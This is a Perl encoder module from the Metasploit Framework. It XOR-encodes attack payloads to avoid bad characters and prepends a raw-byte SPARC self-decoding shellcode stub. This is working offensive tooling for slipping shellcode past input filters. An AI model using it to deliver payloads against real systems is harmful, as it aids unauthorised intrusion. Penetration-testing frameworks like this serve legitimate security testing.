
#
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Encoder::_Sparc;
use strict;
use base 'Msf::Encoder';
use Pex::SPARC;

sub EncodePayload {
    my $self     = shift;
    my $payload  = shift;
    my $badchars = shift;

    my $encoderp = 'Msf::Encoder::Sparc::CheckEncoder';

    # Check for a null dword in the payload first, this will break the decoder
    my $check = $payload;
    while (length($check)) {
    	my $word = substr($check, 0, 4, '');
        if ($word eq pack('N', 0)) {
        	$self->PrintLine("[*] Sparc decoder is not able to handle null dwords in the payload");
        	return;
        }  
    }

    # Append a null to the payload, this becomes the end tag
    $payload .= pack('N', 0);

    my $xor_key = $encoderp->KeyScan($payload, $badchars);
    if(!$xor_key) {
        $self->PrintDebugLine(3, 'Failed to find xor key');
        return;                                            
    }

    my $xor_data = $encoderp->Encode($xor_key, $payload);

    # Flip the key endian-ness
    $xor_key = unpack('V', pack('N', $xor_key));

    my $encoder = 
	Pex::SPARC::SetDword($xor_key, 'l1').
        "\x20\xbf\xff\xff".   # /* bn,a  _start - 4 */
        "\x20\xbf\xff\xff".   # /* bn,a  _start     */
        "\x7f\xff\xff\xff".   # /* call  _start + 4 */
        "\xea\x03\xe0\x20".   # /* ld    [%o7 + 0x20],%l7 */
        "\xaa\x9d\x40\x11".   # /* xorcc %l5,%l1,%l5 */
        "\xea\x23\xe0\x20".   # /* st    %l5,[%o7 + 0x20] */
        "\xa2\x04\x40\x15".   # /* add   %l1,%l5,%l1 */
        "\x81\xdb\xe0\x20".   # /* flush %o7 + 0x20 */
        "\x12\xbf\xff\xfb".   # /* bnz   dec_loop */
        "\x9e\x03\xe0\x04";   # /* add   %o7,4,%o7 */
    
    if(Pex::Text::BadCharIndex($badchars, $encoder) != -1) {
      $self->PrintDebugLine(3, 'Bad character in encoded payload');
      return;
    }

    return $encoder . $xor_data;
}

1;

package Msf::Encoder::Sparc::CheckEncoder;
use base 'Pex::Encoding::XorDwordFeedbackN';

# override the check method to check the SetDword, and return a failure index...
sub _Check {
  my $self = shift;
  my $key = shift;
  my $data = shift;
  my $badChars = shift;

  my $set = Pex::SPARC::SetDword(unpack('V', pack('N', $key)), 'l1');
  my $pos = Pex::Text::BadCharIndex($badChars, $set);

  # no bad bytes in the set encoding, call the parent _Check
  if($pos == -1) {
    return($self->SUPER::_Check($key, $data, $badChars, @_));
  }

# need a hug, debug!
#  print STDERR "Bad at $pos!\n";
#  print Pex::Text::BufferC($set);

  # [ 0 ] [ register ] [ 4 ] [ imm22 ]
  # 31    29           24    21      0

  # [ 2 ] [ dst register ] [ 2 ] [ src register ] [ 1 ] [ simm13 ]
  # 31    29               24    18               13    12       0

  if($pos == 1) { return(0); }
  if($pos == 2) { return(1); }
  if($pos == 3) { return(2); }
  if($pos == 6) { return(2); }
  if($pos == 7) { return(3); }

  # the bad byte is not in an immediate part, we're screwed..
  # just return 0 I guess
  return(0);
}

1;
